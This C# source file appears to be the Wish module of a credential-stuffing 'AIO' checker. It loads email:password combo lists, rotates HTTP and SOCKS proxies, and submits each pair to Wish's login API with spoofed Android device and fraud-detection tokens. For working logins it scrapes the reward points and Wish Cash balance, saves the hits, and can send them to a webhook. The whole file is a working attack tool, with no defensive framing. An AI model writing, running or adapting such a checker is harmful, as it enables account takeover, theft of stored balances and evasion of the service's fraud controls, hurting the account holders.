using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class Wishmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];

                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.AddHeader("Cookie", "_xsrf=1;");
                            var res = req.Post(new Uri(
                                $"https://www.wish.com/api/email-login?email={array[0]}&password={array[1]}&session_refresh=false&app_device_id=13dc8379-82b2-3b01-aeab-592a7c78ed38&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C61%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C85%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C109%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C152%2C154%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C193%2C194%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C207%2C209&_app_type=wish&_riskified_session_token=9cd23af4-f035-4fb2-809b-c0fede01d029&_threat_metrix_session_token=7625-6c870f21-b654-4d63-b79d-e607cd23f212&advertiser_id=caf72538-cf4c-4328-9c1c-a4f33e16d6d4&_version=4.36.1&app_device_model=SM-G930K"));
                            var strResponse = res.ToString();
                            if (strResponse.Contains("\"session_token\""))
                            {
                                var sweeper_session = Uri.UnescapeDataString(
                                    res.Cookies.GetCookies("https://www.wish.com")["sweeper_session"].Value
                                        .Replace("%22", ""));
                                var captures = "";

                                captures = WishGetPointsAndBalance(sweeper_session).Replace("\\u00a0", "")
                                    .Replace("\\u010d", "").Replace("\\u20bd", "");

                                if (captures == "")
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Wish_hits",
                                        array[0] + ":" + array[1] + " | Balance: ? - Points: ?");
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Wish",
                                            array[0] + ":" + array[1] + " | Balance: ? - Points: ?");
                                }
                                else if (captures.Contains("0.00") || captures.Contains("0,00"))
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Wish_frees", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("Wish", array[0] + ":" + array[1]);
                                }
                                else
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Wish_hits", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG") Settings.PrintHit("VyperVPN", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Wish Hits");
                                }
                            }
                            else
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string WishGetPointsAndBalance(string sweeper_session)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.IgnoreProtocolErrors = true;
                        req.AllowAutoRedirect = false;
                        req.AddHeader("Cookie", $"_xsrf=1; sweeper_session={sweeper_session};");

                        var res = req.Post(new Uri(
                            "https://www.wish.com/api/redeemable-rewards/get-rewards?get_dashboard_info=true&offset=0&count=20&reward_type=1&app_device_id=13dc8379-82b2-3b01-aeab-592a7c78ed38&_xsrf=1&_client=androidapp&_capabilities=2,3,4,6,7,9,11,12,13,15,21,24,25,28,35,37,39,40,43,46,47,49,50,51,52,53,55,57,58,60,61,64,65,67,68,70,71,74,76,77,78,80,82,83,85,86,90,93,94,95,96,100,101,102,103,106,108,109,110,111,153,114,115,117,118,122,123,124,125,126,128,129,132,133,134,135,138,139,146,147,148,149,150,152,154,155,156,157,159,160,161,162,163,164,165,166,171,172,173,174,175,176,177,180,181,182,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,209&_app_type=wish&_riskified_session_token=9cd23af4-f035-4fb2-809b-c0fede01d029&_threat_metrix_session_token=7625-6c870f21-b654-4d63-b79d-e607cd23f212&advertiser_id=caf72538-cf4c-4328-9c1c-a4f33e16d6d4&_version=4.36.1&app_device_model=SM-G930K"));
                        var strResponse = res.ToString();

                        var points = "";
                        var balance = "";

                        if (res.StatusCode == HttpStatusCode.OK)
                        {
                            var jsonObj = (JObject) JsonConvert.DeserializeObject(strResponse);

                            points = jsonObj["data"]["dashboard_info"]["available_points"].ToString();
                        }
                        else
                        {
                            continue;
                        }

                        while (true)
                        {
                            req.AddHeader("Cookie", $"_xsrf=1; sweeper_session={sweeper_session}");

                            var res2 = req.Get(new Uri("https://www.wish.com/cash"));
                            var strResponse2 = res2.ToString();

                            if (strResponse2.Contains("\"wish_cash_balance\""))
                            {
                                balance = Regex.Match(strResponse2, "\"wish_cash_balance\": \"(.*?)\"").Groups[1].Value;
                                return $"Balance: {balance} - Points: {points}";
                            }
                        }
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}